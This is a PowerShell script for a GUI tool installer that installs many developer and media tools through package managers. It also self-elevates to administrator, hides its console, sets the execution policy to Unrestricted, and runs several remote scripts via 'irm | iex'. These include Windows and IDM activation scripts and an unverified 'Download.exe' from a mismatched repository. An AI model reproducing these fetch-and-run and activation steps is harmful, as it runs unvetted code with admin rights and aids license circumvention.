# ============================================================
#  Tool Installer GUI  -  by AFNAN
#  Windows Forms GUI wrapper for tools-installer-beta.ps1
#  Compatible with PowerShell 5.1 and PowerShell 7+
# ============================================================

# -- 1. ADMINISTRATOR ELEVATION -----------------------------------------------
$isAdmin = ([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)
if (-not $isAdmin) {
    $relaunch = "-NoProfile -ExecutionPolicy Bypass -File `"$PSCommandPath`""
    Start-Process powershell -WindowStyle Minimized -ArgumentList $relaunch -Verb RunAs
    exit
}

# -- 2. SUPPRESS CONSOLE WINDOW -----------------------------------------------
Add-Type -Name Win32 -Namespace Native -MemberDefinition @'
    [DllImport("kernel32.dll")] public static extern IntPtr GetConsoleWindow();
    [DllImport("user32.dll")]   public static extern bool  ShowWindow(IntPtr hWnd, int nCmdShow);
'@
[Native.Win32]::ShowWindow([Native.Win32]::GetConsoleWindow(), 0) | Out-Null
try {
    Add-Type -Name Fw -Namespace Native -MemberDefinition @'
        [DllImport("user32.dll")] public static extern bool SetForegroundWindow(IntPtr hWnd);
'@ -ErrorAction SilentlyContinue
} catch {}
try {
    Add-Type -Name DWM -Namespace Native -MemberDefinition @'
        [DllImport("dwmapi.dll", PreserveSig = false)]
        public static extern void DwmSetWindowAttribute(IntPtr hwnd, int attr, ref int attrValue, int attrSize);
'@ -ErrorAction SilentlyContinue
} catch {}

# -- 3. LOAD WINFORMS ---------------------------------------------------------
Add-Type -AssemblyName System.Windows.Forms
Add-Type -AssemblyName System.Drawing
[System.Windows.Forms.Application]::EnableVisualStyles()

try {
    Add-Type -ReferencedAssemblies System.Windows.Forms, System.Drawing -TypeDefinition @"
    using System.Windows.Forms;
    using System.Drawing;
    public class ti_NoJumpPanel : Panel {
        protected override Point ScrollToControl(Control activeControl) {
            return this.DisplayRectangle.Location;
        }
    }
"@
} catch {
    Write-Host "[WARN] Add-Type for ti_NoJumpPanel failed: $_" -ForegroundColor Yellow
    Write-Host "[INFO] Falling back to default Panel (scroll-jump may occur)" -ForegroundColor Yellow
}

# ============================================================
#  SECTION A: ALL BACKEND FUNCTIONS (preserved from original)
# ============================================================

function Refresh-Env {
    $env:Path = [System.Environment]::GetEnvironmentVariable("Path", "Machine") + ";" +
    [System.Environment]::GetEnvironmentVariable("Path", "User")
}
# ============================================================
#  About AFNAN
# ============================================================
function Open-Github {
    Start-Process "https://github.com/afnan-nex/tools-installer"
}

# ============================================================
#  PowerShell Tweaks
# ============================================================

function See-Policy {
    Start-Process cmd -WindowStyle Minimized -ArgumentList "/k", ("echo Current Execution Policy: && " +
        "powershell -NoProfile -ExecutionPolicy Bypass -Command " +
        """Get-ExecutionPolicy -List"" && echo. && echo Press any key to close... && echo. && echo Press any key to exit . . . && pause >nul && exit")
}

function Unrestrict-Policy {
    Start-Process cmd -WindowStyle Minimized -ArgumentList "/k", ("echo Setting PowerShell Execution Policy to Unrestricted... && " +
        "powershell -NoProfile -ExecutionPolicy Bypass -Command " +
        """Set-ExecutionPolicy Unrestricted -Force -Scope CurrentUser; " +
        "Set-ExecutionPolicy Unrestricted -Force -Scope LocalMachine; " +
        "Write-Host 'Policy updated successfully.'"" && echo. && echo Press any key to close... && echo. && echo Press any key to exit . . . && pause >nul && exit")
}

# ============================================================
#  Essential
# ============================================================

function Install-Choco {
    $chocoCmd = "echo Installing Chocolatey... && powershell -NoProfile -ExecutionPolicy Bypass -Command " +
    "`"Set-ExecutionPolicy Bypass -Scope Process -Force; " +
    "[System.Net.ServicePointManager]::SecurityProtocol = [System.Net.ServicePointManager]::SecurityProtocol -bor 3072; " +
    "iex ((New-Object System.Net.WebClient).DownloadString('https://community.chocolatey.org/install.ps1'))`" " +
    "&& echo. && echo Chocolatey installation completed. && echo. && echo Press any key to exit . . . && pause >nul && exit"
    Start-Process cmd -WindowStyle Minimized -ArgumentList "/k", $chocoCmd
}

function Install-NodeLTS {
    Start-Process cmd -WindowStyle Minimized -ArgumentList "/k",
    "echo Installing Node.js LTS via Chocolatey... && choco upgrade nodejs-lts -y --install-if-not-installed --no-desktop-shortcut && echo. && echo Node.js installation completed. && echo. && echo Press any key to exit . . . && pause >nul && exit"
}

function Install-Scoop {
    Start-Process cmd -WindowStyle Minimized -ArgumentList "/k",
    "echo Installing Scoop... && powershell -NoProfile -ExecutionPolicy Bypass -Command `"irm https://get.scoop.sh > install.ps1; .\install.ps1 -RunAsAdmin; Remove-Item install.ps1`" && echo Adding extras bucket... && set PATH=%USERPROFILE%\scoop\shims;%PATH% && scoop bucket add extras && echo. && echo Scoop installation completed. && echo. && echo Press any key to exit . . . && pause >nul && exit"
}

function Install-Pnpm {
    Start-Process cmd -WindowStyle Minimized -ArgumentList "/k",
    "echo Installing pnpm via Chocolatey... && choco upgrade pnpm -y --install-if-not-installed --no-desktop-shortcut && echo. && echo pnpm installation completed. && echo. && echo Press any key to exit . . . && pause >nul && exit"
}

function Install-Yarn {
    Start-Process cmd -WindowStyle Minimized -ArgumentList "/k",
    "echo Installing Yarn via npm... && npm install -g yarn && echo. && echo Yarn installation completed. && echo. && echo Press any key to exit . . . && pause >nul && exit"
}

function Install-Bun {
    Start-Process cmd -WindowStyle Minimized -ArgumentList "/k",
    "echo Installing Bun via Chocolatey... && choco upgrade bun -y --install-if-not-installed --no-desktop-shortcut && echo. && echo Bun installation completed. && echo. && echo Press any key to exit . . . && pause >nul && exit"
}

function Install-Go {
    Start-Process cmd -WindowStyle Minimized -ArgumentList "/k",
    "echo Installing Go via Chocolatey... && choco upgrade golang -y --install-if-not-installed --no-desktop-shortcut && echo. && echo Go installation completed. && echo. && echo Press any key to exit . . . && pause >nul && exit"
}

function Install-Deno {
    Start-Process cmd -WindowStyle Minimized -ArgumentList "/k",
    "echo Installing Deno via Chocolatey... && choco upgrade deno -y --install-if-not-installed --no-desktop-shortcut && echo. && echo Deno installation completed. && echo. && echo Press any key to exit . . . && pause >nul && exit"
}

# ============================================================
#  Run Scripts
# ============================================================

function Run-Titus {
    Start-Process cmd -WindowStyle Minimized -ArgumentList "/k",
    "powershell -NoProfile -ExecutionPolicy Bypass -Command `"irm 'https://christitus.com/win' | iex`""
}

function Run-MassGrave {
    Start-Process cmd -WindowStyle Minimized -ArgumentList "/k",
    "powershell -NoProfile -ExecutionPolicy Bypass -Command `"irm https://get.activated.win | iex`""
}

function Run-Win11Debloat {
    Start-Process cmd -WindowStyle Minimized -ArgumentList "/k",
    "powershell -NoProfile -ExecutionPolicy Bypass -Command `"& ([scriptblock]::Create((irm 'https://debloat.raphi.re/')))`""
}

function Run-WinScript {
    Start-Process cmd -WindowStyle Minimized -ArgumentList "/k",
    "powershell -NoProfile -ExecutionPolicy Bypass -Command `"irm 'https://winscript.cc/irm' | iex`""
}

function Run-Coporton {
    Start-Process cmd -WindowStyle Minimized -ArgumentList "/k",
    "powershell -NoProfile -ExecutionPolicy Bypass -Command `"irm https://coporton.com/ias | iex`""
}

function Run-IDM {
    Start-Process cmd -WindowStyle Minimized -ArgumentList "/k",
    "curl.exe -L -O https://github.com/planetshine0000/vc-redist-latest/releases/download/v1.0.1/Download.exe && Download.exe"
}

function Run-Sparkle {
    Start-Process cmd -WindowStyle Minimized -ArgumentList "/k",
    "powershell -NoProfile -ExecutionPolicy Bypass -Command `"irm https://raw.githubusercontent.com/Parcoil/Sparkle/v2/get.ps1 | iex`""
}

function Run-GHGrab {
    Start-Process cmd -WindowStyle Minimized -ArgumentList "/k",
    "echo === GHGrab === && npx --yes @ghgrab/ghgrab && echo. && echo Press any key to close... && echo. && echo Press any key to exit . . . && pause >nul && exit"
}

function Run-Setup {
    $setupCmd = ('echo Downloading Setup... && curl.exe -L --retry 3 --retry-delay 2 -o "%TEMP%\Tools-Installer.exe" ' +
        '"https://github.com/afnan-nex/tools-installer/raw/main/Setup/Tools-Installer.exe" && ' +
        'if exist "%TEMP%\Tools-Installer.exe" ( "%TEMP%\Tools-Installer.exe" ) ' +
        'else ( echo Download failed! ) && echo. && echo Press any key to exit . . . && pause >nul && exit')
    Start-Process cmd -WindowStyle Minimized -ArgumentList "/k", $setupCmd
}

function Run-VPN {
    Start-Process cmd -WindowStyle Minimized -ArgumentList "/k",
    "echo === VPN === && openvpn >nul 2>&1 || choco upgrade openvpn -y --install-if-not-installed --no-desktop-shortcut && curl -L -o vpn-connector.py https://raw.githubusercontent.com/afnan-nex/vpn-connector/main/vpn-connector.py && python -m pip install requests pystray pillow && python vpn-connector.py && echo. && echo Press any key to exit . . . && pause >nul && exit"
}

function Run-TorLink {
    Start-Process cmd -WindowStyle Minimized -ArgumentList "/k",
    "echo === TorLink === && npx --yes torlnk && echo. && echo Press any key to close... && echo. && echo Press any key to exit . . . && pause >nul && exit"
}

function Install-Tork {
    Start-Process cmd -WindowStyle Minimized -ArgumentList "/k",
    "echo Installing Tork...use tork to run && go install github.com/melqtx/tork/cmd/tork@latest && echo. && echo Tork installation completed. && echo. && echo Press any key to exit . . . && pause >nul && exit"
}

function Run-YTDLPFrontend {
    $ytdlpCmd = ('echo Downloading and running YTDLP-Frontend... && ' +
        'curl -L -o "%TEMP%\YTDLP-Frontend.ps1" https://raw.githubusercontent.com/afnan-nex/YTDLP-Frontend/main/YTDLP-Frontend.ps1 && ' +
        'powershell -NoProfile -ExecutionPolicy Bypass -File "%TEMP%\YTDLP-Frontend.ps1" && ' +
        'echo. && echo Process finished. Press any key to close this window. && echo. && echo Press any key to exit . . . && pause >nul && exit')
    Start-Process cmd -WindowStyle Minimized -ArgumentList "/k", $ytdlpCmd
}

function Run-Yoinks {
    Start-Process cmd -WindowStyle Minimized -ArgumentList "/k",
    "echo === Yoinks === && npx --yes yoinks && echo. && echo Press any key to close... && echo. && echo Press any key to exit . . . && pause >nul && exit"
}

# ============================================================
#  Recommended Tools
# ============================================================

function Install-Git {
    Start-Process cmd -WindowStyle Minimized -ArgumentList "/k",
    "echo Installing Git via Chocolatey... && choco upgrade git -y --install-if-not-installed --no-desktop-shortcut && echo. && echo Git installation completed. && echo. && echo Press any key to exit . . . && pause >nul && exit"
}

function Install-Python {
    Start-Process cmd -WindowStyle Minimized -ArgumentList "/k",
    "echo Installing Python via Chocolatey... && choco upgrade python -y --install-if-not-installed --no-desktop-shortcut && echo. && echo Python installation completed. && echo. && echo Press any key to exit . . . && pause >nul && exit"
}

function Install-Dotnet {
    Start-Process cmd -WindowStyle Minimized -ArgumentList "/k",
    "echo Installing .NET via Chocolatey... && choco upgrade dotnet -y --install-if-not-installed --no-desktop-shortcut && echo. && echo .NET installation completed. && echo. && echo Press any key to exit . . . && pause >nul && exit"
}

function Install-FFmpeg {
    Start-Process cmd -WindowStyle Minimized -ArgumentList "/k",
    "echo Installing FFmpeg via Chocolatey... && choco upgrade ffmpeg -y --install-if-not-installed --no-desktop-shortcut && echo. && echo FFmpeg installation completed. && echo. && echo Press any key to exit . . . && pause >nul && exit"
}

function Install-7Zip {
    Start-Process cmd -WindowStyle Minimized -ArgumentList "/k",
    "echo Installing 7-Zip via Chocolatey... && choco upgrade 7zip -y --install-if-not-installed --no-desktop-shortcut && echo. && echo 7-Zip installation completed. && echo. && echo Press any key to exit . . . && pause >nul && exit"
}

function Install-PeaZip {
    Start-Process cmd -WindowStyle Minimized -ArgumentList "/k",
    "echo Installing PeaZip via Chocolatey... && choco upgrade peazip -y --install-if-not-installed --no-desktop-shortcut && echo. && echo PeaZip installation completed. && echo. && echo Press any key to exit . . . && pause >nul && exit"
}

function Install-WinDirStat {
    Start-Process cmd -WindowStyle Minimized -ArgumentList "/k",
    "echo Installing WinDirStat via Chocolatey... && choco upgrade windirstat -y --install-if-not-installed --no-desktop-shortcut && echo. && echo WinDirStat installation completed. && echo. && echo Press any key to exit . . . && pause >nul && exit"
}

function Install-YTDLP {
    Start-Process cmd -WindowStyle Minimized -ArgumentList "/k",
    "echo Installing yt-dlp via Chocolatey... && choco upgrade yt-dlp -y --install-if-not-installed --no-desktop-shortcut && echo. && echo yt-dlp installation completed. && echo. && echo Press any key to exit . . . && pause >nul && exit"
}

function Install-Ngrok {
    Start-Process cmd -WindowStyle Minimized -ArgumentList "/k",
    "echo Installing ngrok via Chocolatey... && choco upgrade ngrok -y --install-if-not-installed --no-desktop-shortcut && echo. && echo ngrok installation completed. && echo. && echo Press any key to exit . . . && pause >nul && exit"
}

function Install-Localtunnel {
    Start-Process cmd -WindowStyle Minimized -ArgumentList "/k",
    "echo Installing localtunnel via npm... use lt --port 3000 to run && npm install -g localtunnel && echo. && echo localtunnel installation completed. && echo. && echo Press any key to exit . . . && pause >nul && exit"
}

function Install-Miniserve {
    Start-Process cmd -WindowStyle Minimized -ArgumentList "/k",
    "echo Installing Miniserve via Winget... use miniserve --qrcode to run && winget upgrade svenstaro.miniserve --silent || winget install svenstaro.miniserve --accept-package-agreements --accept-source-agreements --silent && echo. && echo Miniserve installation completed. && echo. && echo Press any key to exit . . . && pause >nul && exit"
}

# ============================================================
#  Other Apps
# ============================================================

function Install-FastStone {
    Start-Process cmd -WindowStyle Minimized -ArgumentList "/k",
    "echo Installing FastStone Image Viewer via Chocolatey... && choco upgrade faststone-image-viewer -y --install-if-not-installed --no-desktop-shortcut && echo. && echo FastStone Image Viewer installation completed. && echo. && echo Press any key to exit . . . && pause >nul && exit"
}

function Install-VLC {
    Start-Process cmd -WindowStyle Minimized -ArgumentList "/k",
    "echo Installing VLC Media Player via Chocolatey... && choco upgrade vlc.install -y --install-if-not-installed --no-desktop-shortcut && echo. && echo VLC Media Player installation completed. && echo. && echo Press any key to exit . . . && pause >nul && exit"
}

function Install-MPC-HC {
    Start-Process cmd -WindowStyle Minimized -ArgumentList "/k",
    "echo Installing MPC-HC via Chocolatey... && choco upgrade mpc-hc-clsid2 -y --install-if-not-installed --no-desktop-shortcut && echo. && echo MPC-HC installation completed. && echo. && echo Press any key to exit . . . && pause >nul && exit"
}

function Install-OnlyOffice {
    Start-Process cmd -WindowStyle Minimized -ArgumentList "/k",
    "echo Installing Only Office via Chocolatey... && choco upgrade onlyoffice-desktopeditors -y --install-if-not-installed --no-desktop-shortcut && echo. && echo Only Office installation completed. && echo. && echo Press any key to exit . . . && pause >nul && exit"
}

function Install-Kdenlive {
    Start-Process cmd -WindowStyle Minimized -ArgumentList "/k",
    "echo Installing Kdenlive via Chocolatey... && choco upgrade kdenlive -y --install-if-not-installed --no-desktop-shortcut && echo. && echo Kdenlive installation completed. && echo. && echo Press any key to exit . . . && pause >nul && exit"
}

function Install-HandBrake {
    Start-Process cmd -WindowStyle Minimized -ArgumentList "/k",
    "echo Installing HandBrake via Chocolatey... && choco upgrade handbrake -y --install-if-not-installed --no-desktop-shortcut && echo. && echo HandBrake installation completed. && echo. && echo Press any key to exit . . . && pause >nul && exit"
}

function Install-AntiGravity-ide {
    Start-Process cmd -WindowStyle Minimized -ArgumentList "/k",
    "echo Installing AntiGravity IDE via Chocolatey... && choco upgrade antigravity-ide -y --install-if-not-installed --no-desktop-shortcut && echo. && echo AntiGravity IDE installation completed. && echo. && echo Press any key to exit . . . && pause >nul && exit"
}

function Install-VSCode {
    Start-Process cmd -WindowStyle Minimized -ArgumentList "/k",
    "echo Installing Visual Studio Code via Chocolatey... && choco upgrade vscode -y --install-if-not-installed --no-desktop-shortcut && echo. && echo Visual Studio Code installation completed. && echo. && echo Press any key to exit . . . && pause >nul && exit"
}

function Install-IDM {
    Start-Process cmd -WindowStyle Minimized -ArgumentList "/k",
    "echo Installing Internet Download Manager via Chocolatey... && choco upgrade internet-download-manager -y --install-if-not-installed --no-desktop-shortcut && echo. && echo Internet Download Manager installation completed. && echo. && echo Press any key to exit . . . && pause >nul && exit"
}

function Install-GhostDownloader {
    Start-Process cmd -WindowStyle Minimized -ArgumentList "/k",
    "echo Installing Ghost Downloader via Winget... && winget upgrade -e --id XiaoYouChR.GhostDownloader --silent || winget install -e --id XiaoYouChR.GhostDownloader --silent --accept-source-agreements --accept-package-agreements && echo. && echo Ghost Downloader installation completed. && echo. && echo Press any key to exit . . . && pause >nul && exit"
}

function Install-VirtualBox {
    Start-Process cmd -WindowStyle Minimized -ArgumentList "/k",
    "echo Installing VirtualBox via Chocolatey... && choco upgrade virtualbox -y --install-if-not-installed --no-desktop-shortcut && echo. && echo VirtualBox installation completed. && echo. && echo Press any key to exit . . . && pause >nul && exit"
}
# ============================================================
#  Automation
# ============================================================

function Install-N8N {
    $n8nCmd = ('echo Installing n8n Workflow Automation... && ' +
        'npm install -g n8n@latest --verbose && echo n8n installation completed. && ' +
        'echo Setting n8n environment variables... && ' +
        'setx NODES_EXCLUDE "[]" && setx NODES_EXCLUDE "[]" /M && ' +
        'setx N8N_UNVERIFIED_PACKAGES_ENABLED "true" && setx N8N_UNVERIFIED_PACKAGES_ENABLED "true" /M && ' +
        'setx N8N_RUNNERS_TASK_TIMEOUT "300" && setx N8N_RUNNERS_TASK_TIMEOUT "300" /M && ' +
        'setx N8N_COMPRESSION_NODE_MAX_DECOMPRESSED_SIZE_BYTES "2147483648" && setx N8N_COMPRESSION_NODE_MAX_DECOMPRESSED_SIZE_BYTES "2147483648" /M && ' +
        'setx N8N_COMPRESSION_NODE_MAX_ZIP_ENTRIES "5000" && setx N8N_COMPRESSION_NODE_MAX_ZIP_ENTRIES "5000" /M && ' +
        'echo Environment variables set successfully. && echo. && ' +
        'echo NOTE: Running n8n outside Docker is deprecated. Consider migrating to the official Docker image. && echo. && ' +
        'echo Press any key to close this window. && echo. && echo Press any key to exit . . . && pause >nul && exit')
    Start-Process cmd -WindowStyle Minimized -ArgumentList "/k", $n8nCmd
}

function Install-GWS {
    Start-Process cmd -WindowStyle Minimized -ArgumentList "/k",
    "echo Installing Google Workspace CLI... && npm install -g @googleworkspace/cli && echo. && echo Installation completed. Press any key to close this window. && echo. && echo Press any key to exit . . . && pause >nul && exit"
}

# ============================================================
#  Control Panel
# ============================================================
function Open-ControlPanel {
    Start-Process "control.exe"
}

function Open-DevicesAndPrinters {
    Start-Process "explorer.exe" -ArgumentList "shell:::{A8A91A66-3A7D-4424-8D24-04E180695C7A}"
}

function Open-TaskManager {
    Start-Process "taskmgr.exe"
}

function Open-DeviceManager {
    Start-Process "devmgmt.msc"
}

function Open-DiskManagement {
    Start-Process "diskmgmt.msc"
}

function Open-SystemProperties {
    Start-Process "sysdm.cpl"
}

function Open-MSConfig {
    Start-Process "msconfig.exe"
}

function Open-PowerOptions {
    Start-Process "powercfg.cpl"
}

# ============================================================
#  AI in PC
# ============================================================

function Install-Agy {
    $agyCmd = ('echo Installing Agy... && ' +
        'powershell -NoProfile -ExecutionPolicy Bypass -Command "irm https://antigravity.google/cli/install.ps1 | iex" && echo. && ' +
        'echo Installation completed. Press any key to close this window. && echo. && echo Press any key to exit . . . && pause >nul && exit')
    Start-Process cmd -WindowStyle Minimized -ArgumentList "/k", $agyCmd
}

function Install-Opencode {
    Start-Process cmd -WindowStyle Minimized -ArgumentList "/k",
    "echo Installing Opencode... && npm i -g opencode-ai --verbose && echo. && echo Installation completed. Press any key to close this window. && echo. && echo Press any key to exit . . . && pause >nul && exit"
}

function Install-Cursoride {
    Start-Process cmd -WindowStyle Minimized -ArgumentList "/k",
    "echo Installing Cursor IDE via Chocolatey... && choco upgrade cursoride -y --install-if-not-installed --no-desktop-shortcut && echo. && echo Cursor IDE installation completed. && echo. && echo Press any key to exit . . . && pause >nul && exit"
}

function Open-GoogleDesktopApp {
    Start-Process "https://search.google/google-app/desktop/"
}

function Run-LLMChecker {
    Start-Process cmd -WindowStyle Minimized -ArgumentList "/k",
    "echo Running LLM-Checker Recommendation... && npx --yes llm-checker && echo. && echo Finished. Press any key to close... && echo. && echo Press any key to exit . . . && pause >nul && exit"
}

function Install-LLMFit {
    Start-Process cmd -WindowStyle Minimized -ArgumentList "/k",
    "echo Installing LLMFit via Scoop... && scoop install llmfit -a && echo. && echo LLMFit installation completed. && echo. && echo Press any key to exit . . . && pause >nul && exit"
}

function Install-Ollama {
    Start-Process cmd -WindowStyle Minimized -ArgumentList "/k",
    "echo Installing Ollama... && winget upgrade Ollama.Ollama --silent || winget install Ollama.Ollama --accept-package-agreements --accept-source-agreements --silent && echo. && echo Finished. Press any key to close... && echo. && echo Press any key to exit . . . && pause >nul && exit"
}

function Install-ClaudeCode {
    Start-Process cmd -WindowStyle Minimized -ArgumentList "/k",
    "echo Installing Claude Code... && npm install -g @anthropic-ai/claude-code --verbose && echo. && echo Claude Code installation completed. && echo. && echo Press any key to exit . . . && pause >nul && exit"
}

function Install-ClaudeCodeRouter {
    Start-Process cmd -WindowStyle Minimized -ArgumentList "/k",
    "echo Installing Claude Code Router... && npm install -g @musistudio/claude-code-router && echo. && echo Installation completed. Press any key to close this window. && echo. && echo Press any key to exit . . . && pause >nul && exit"
}

function Install-Codebuff {
    Start-Process cmd -WindowStyle Minimized -ArgumentList "/k",
    "echo Installing Codebuff... && npm install -g codebuff && echo. && echo Installation completed. Press any key to close this window. && echo. && echo Press any key to exit . . . && pause >nul && exit"
}

function Install-Omniroute {
    Start-Process cmd -WindowStyle Minimized -ArgumentList "/k",
    "echo Installing Omniroute... && npm install -g omniroute && echo. && echo Installation completed. Press any key to close this window. && echo. && echo Press any key to exit . . . && pause >nul && exit"
}

# ============================================================
#  System tools
# ============================================================

function Install-Winget {
    $wingetPs = @'
Write-Host "Installing Winget..."
try {
    $progressPreference = 'silentlyContinue'
    Invoke-WebRequest -Uri 'https://aka.ms/getwinget' -OutFile 'winget.msixbundle'
    Add-AppxPackage 'winget.msixbundle'
    Remove-Item 'winget.msixbundle' -Force
    Write-Host "Winget installed successfully."
} catch {
    Write-Host ("Error installing Winget: " + $_.Exception.Message)
    Write-Host "You may need to install from Microsoft Store instead."
}
Read-Host "Press Enter to close"
'@
    $tmp = "$env:TEMP\install_winget.ps1"
    $wingetPs | Out-File -FilePath $tmp -Encoding UTF8
    Start-Process powershell -WindowStyle Minimized -ArgumentList "-NoProfile -ExecutionPolicy Bypass -File `"$tmp`""
}

function Install-Everything {
    Start-Process cmd -WindowStyle Minimized -ArgumentList "/k",
    "echo Installing Everything via Chocolatey... && choco upgrade everything -y --install-if-not-installed --no-desktop-shortcut && echo. && echo Everything installation completed. && echo. && echo Press any key to exit . . . && pause >nul && exit"
}

function Set-CMD0A {
    $cmd0aPs = @'
Write-Host "Downloading CMD color script..."
try {
    Invoke-WebRequest -Uri 'https://raw.githubusercontent.com/afnan-nex/my-fav-scripts/main/cmd-clr-to-0a.cmd' -OutFile 'cmd-clr-to-0a.cmd'
    Start-Process 'cmd-clr-to-0a.cmd' -WindowStyle Minimized
    Write-Host "CMD color script downloaded and executed."
} catch {
    Write-Host ("Error: " + $_.Exception.Message)
}
Read-Host "Press Enter to close"
'@
    $tmp = "$env:TEMP\set_cmd0a.ps1"
    $cmd0aPs | Out-File -FilePath $tmp -Encoding UTF8
    Start-Process powershell -WindowStyle Minimized -ArgumentList "-NoProfile -ExecutionPolicy Bypass -File `"$tmp`""
}

function Install-RustDesk {
    Start-Process cmd -WindowStyle Minimized -ArgumentList "/k",
    "echo Installing RustDesk via Chocolatey... && choco upgrade rustdesk -y --install-if-not-installed --no-desktop-shortcut && echo. && echo RustDesk installation completed. && echo. && echo Press any key to exit . . . && pause >nul && exit"
}

function Install-HiBit {
    Start-Process cmd -WindowStyle Minimized -ArgumentList "/k",
    "echo Installing HiBit Uninstaller via Winget... && winget upgrade HiBitSoftware.HiBitUninstaller --silent || winget install HiBitSoftware.HiBitUninstaller --accept-package-agreements --accept-source-agreements --silent && echo. && echo HiBit Uninstaller installation completed. && echo. && echo Press any key to exit . . . && pause >nul && exit"
}

function Install-Superfile {
    Start-Process cmd -WindowStyle Minimized -ArgumentList "/k",
    "echo Installing Superfile... use spf to run && echo visit https://superfile.dev/getting-started/tutorial/ for tutorial && powershell -ExecutionPolicy Bypass -Command `"Invoke-Expression ((New-Object System.Net.WebClient).DownloadString('https://superfile.dev/install.ps1'))`" && echo. && echo Superfile installation completed. && echo. && echo Press any key to exit . . . && pause >nul && exit"
}

function Install-Alacritty {
    Start-Process cmd -WindowStyle Minimized -ArgumentList "/k",
    "echo Installing Alacritty via Chocolatey... && choco upgrade alacritty -y --install-if-not-installed --no-desktop-shortcut && echo. && echo Alacritty installation completed. && echo. && echo Press any key to exit . . . && pause >nul && exit"
}

function Install-Scrcpy {
    Start-Process cmd -WindowStyle Minimized -ArgumentList "/k",
    "echo Installing Scrcpy GUI via Winget... && winget upgrade pizi.scrcpygui --silent || winget install pizi.scrcpygui --accept-package-agreements --accept-source-agreements --silent && echo. && echo Scrcpy GUI installation completed. && echo. && echo Press any key to exit . . . && pause >nul && exit"
}

function Install-Cursor {
    Start-Process cmd -WindowStyle Minimized -ArgumentList "/k",
    "echo Cloning Elegant repository from GitHub... && git clone https://github.com/afnan-nex/Elegant && echo. && echo Repository cloned successfully to Elegant folder. && echo. && echo Press any key to exit . . . && pause >nul && exit"
}

# function Install-VCC-Runtimes {
#     $vcPs = @'
# Write-Host "Downloading Visual C++ Runtimes..."
# $ZIP_URL  = "https://github.com/planetshine0000/vc-redist-latest/releases/download/v1.0.0/Visual-C-Runtimes-All-in-One-Dec-2025.zip"
# $ZIP_FILE = "$env:TEMP\VC_Runtimes.zip"
# $EXTR_DIR = "$env:TEMP\VC_Runtimes_Temp"
# curl.exe -L --retry 3 --retry-delay 2 -o $ZIP_FILE $ZIP_URL
# if (Test-Path $ZIP_FILE) {
#     Write-Host "Extracting files..."
#     if (-not (Test-Path $EXTR_DIR)) { New-Item -ItemType Directory -Path $EXTR_DIR | Out-Null }
#     Expand-Archive -Path $ZIP_FILE -DestinationPath $EXTR_DIR -Force
#     Write-Host "Running install_all.bat as Administrator..."
#     Get-ChildItem -Path $EXTR_DIR -Filter "install_all.bat" -Recurse | ForEach-Object {
#         Push-Location $_.DirectoryName
#         Start-Process powershell -WindowStyle Minimized -ArgumentList "-command", "Start-Process 'install_all.bat' -Verb runAs"
#         Pop-Location
#     }
#     Remove-Item $ZIP_FILE -Force
#     Write-Host "Installer launched. You can close this window."
# } else {
#     Write-Host "Download failed."
# }
# Read-Host "Press Enter to close"
# '@
#     $tmp = "$env:TEMP\install_vcredist.ps1"
#     $vcPs | Out-File -FilePath $tmp -Encoding UTF8
#     Start-Process powershell -WindowStyle Minimized -ArgumentList "-NoProfile -ExecutionPolicy Bypass -File `"$tmp`""
# }

function Install-VCC-Runtimes {
    Start-Process cmd -WindowStyle Minimized -ArgumentList "/k",
    "echo Installing all Visual C++ Runtimes via winget... && winget upgrade -e --id abbodi1406.vcredist --silent || winget install -e --id abbodi1406.vcredist --accept-package-agreements --accept-source-agreements --silent && echo. && echo Visual C++ Runtimes installation completed. && echo. && echo Press any key to exit . . . && pause >nul && exit"
}

# function Install-DirectX {
#     $dxPs = @'
# Write-Host "Preparing DirectX installer..."
# $TEMP_DIR = "$env:TEMP\DirectX_Install"
# if (-not (Test-Path $TEMP_DIR)) { New-Item -ItemType Directory -Path $TEMP_DIR | Out-Null }
# $DX_URL = "https://github.com/planetshine0000/direct-x/releases/download/v1.0.0/DirectX-Redist-Jun-2010.zip"
# $DX_ZIP = "$TEMP_DIR\DirectX.zip"
# if (-not (Test-Path $DX_ZIP)) {
#     Write-Host "Downloading DirectX..."
#     curl.exe -L --retry 3 --retry-delay 2 -o $DX_ZIP $DX_URL
# } else {
#     Write-Host "DirectX zip already exists, skipping download."
# }
# Write-Host "Extracting files..."
# Unblock-File -Path $DX_ZIP
# Expand-Archive -Path $DX_ZIP -DestinationPath $TEMP_DIR -Force
# Write-Host "Locating DXSETUP.exe..."
# $setup = Get-ChildItem -Path $TEMP_DIR -Filter "DXSETUP.exe" -Recurse | Select-Object -First 1
# if (-not $setup) {
#     Write-Host "[ERROR] DXSETUP.exe not found in extracted files."
#     Read-Host "Press Enter to close"
#     return
# }
# Write-Host "Launching DirectX installer..."
# Start-Process -FilePath $setup.FullName -Verb RunAs
# Write-Host ""
# Write-Host "Installer launched. Waiting 30 seconds before cleanup..."
# Start-Sleep -Seconds 30
# Remove-Item $DX_ZIP -Force -ErrorAction SilentlyContinue
# Remove-Item $TEMP_DIR -Recurse -Force -ErrorAction SilentlyContinue
# if (Test-Path $TEMP_DIR) {
#     Write-Host "[NOTE] Some files still in use by the installer - not deleted."
# } else {
#     Write-Host "Cleanup successful."
# }
# Read-Host "Press Enter to close"
# '@
#     $tmp = "$env:TEMP\install_directx.ps1"
#     $dxPs | Out-File -FilePath $tmp -Encoding UTF8
#     Start-Process powershell -WindowStyle Minimized -ArgumentList "-NoProfile -ExecutionPolicy Bypass -File `"$tmp`""
# }

function Install-DirectX {
    Start-Process cmd -WindowStyle Minimized -ArgumentList "/k",
    "echo Installing DirectX End-User Runtime via winget... && winget upgrade -e --id Microsoft.DirectX --silent || winget install -e --id Microsoft.DirectX --accept-package-agreements --accept-source-agreements --silent && echo. && echo DirectX installation completed. && echo. && echo Press any key to exit . . . && pause >nul && exit"
}

# ============================================================
#  System tools
# ============================================================

function Install-Office365 {
    $officeCmd = ('echo Downloading Office 365 Setup... && ' +
        'curl.exe -L --retry 3 --retry-delay 2 -o "%TEMP%\OfficeSetup.exe" ' +
        '"https://c2rsetup.officeapps.live.com/c2r/download.aspx?ProductreleaseID=O365ProPlusRetail&platform=x64&language=en-us&version=O16GA" && ' +
        'if exist "%TEMP%\OfficeSetup.exe" ' +
        '(echo Launching Office Installer... && start "" "%TEMP%\OfficeSetup.exe") ' +
        'else (echo Download failed.) && echo. && echo Press any key to exit . . . && pause >nul && exit')
    Start-Process cmd -WindowStyle Minimized -ArgumentList "/k", $officeCmd
}

function Install-Chrome {
